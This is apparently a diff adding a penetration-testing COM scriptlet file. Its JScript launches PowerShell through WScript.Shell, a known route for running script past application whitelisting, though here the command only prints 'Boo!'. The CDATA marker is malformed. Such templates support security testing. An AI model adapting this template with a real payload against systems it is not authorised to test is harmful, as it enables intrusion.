@@ -1,0 +1,12 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+progid="Pentest"
+classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="JScript">
+![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("powershell -noe -nop -c write-host Boo!");
+]]>
+</script>
+</registration>
+</scriptlet>
